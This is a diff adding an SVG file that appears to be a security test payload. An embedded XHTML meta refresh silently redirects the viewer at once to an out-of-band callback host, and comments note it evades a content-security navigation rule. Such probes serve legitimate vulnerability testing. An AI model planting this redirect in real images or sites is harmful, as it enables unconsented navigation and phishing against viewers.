@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xhtml="http://www.w3.org/1999/xhtml"
+     width="500" height="500">
+  <foreignObject x="0" y="0" width="500" height="500">
+    <xhtml:head>
+      <!-- Zero-click redirect via meta refresh — no script, no style, pure HTML meta -->
+      <!-- navigate-to 'none' is unrecognized so this may fire freely -->
+      <xhtml:meta http-equiv="refresh" 
+                  content="0;url=https://xpxhznhjlolwxxyvdurgehk2cmtiyvvhh.oast.fun/ZEROCLICK-META-REFRESH"/>
+    </xhtml:head>
+    <xhtml:body>
+      <xhtml:p>Redirecting...</xhtml:p>
+    </xhtml:body>
+  </foreignObject>
+  <rect width="500" height="500" fill="#2c3e50"/>
+  <text x="100" y="250" fill="white" font-size="18">META REFRESH TEST</text>
+</svg>
